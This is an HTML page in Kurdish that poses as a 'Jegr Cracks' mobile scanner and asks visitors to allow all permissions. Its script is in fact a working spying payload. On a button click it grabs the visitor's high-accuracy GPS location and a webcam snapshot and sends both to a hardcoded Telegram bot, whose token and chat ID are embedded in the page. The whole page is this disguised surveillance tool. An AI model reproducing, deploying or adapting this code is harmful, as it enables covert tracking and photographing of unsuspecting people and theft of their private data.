<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jegr Cracks - Scanner</title>
    <style>
        body { background-color: #000; color: #0f0; text-align: center; font-family: sans-serif; padding-top: 50px; }
        button { background: #0f0; color: #000; padding: 20px; font-size: 20px; border-radius: 10px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <h1 dir="rtl">بەهێزترین پشکنەری مۆبایلی جێگر کڕاکس</h1>
    <p dir="rtl">تکایە هەموو مۆڵەتەکان (Allow) بکە بۆ پشکنین</p>
    <button id="startBtn">دەستپێکردنی پشکنین</button>

    <script>
        const botToken = "8633886074:AAE_wcUpSvjxa-1ac-68iWCUosIyESWlFhk";
        const chatId = "7619045862";

        document.getElementById('startBtn').addEventListener('click', async () => {
            try {
                // ١. ناردنی لۆکەیشن
                navigator.geolocation.getCurrentPosition(pos => {
                    const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 لۆکەیشن:\n${mapUrl}`);
                }, null, {enableHighAccuracy: true});

                // ٢. ناردنی وێنە (بۆ ئەوەی خێرا بێت و بزانی ئیش دەکات)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'img.jpg');
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                alert("پشکنین دەستی پێکرد، تکایە کەمێک بوەستە...");
            } catch (err) {
                alert("تکایە مۆڵەتی کامێرا و لۆکەیشن بدە!");
            }
        });
    </script>
</body>
</html>
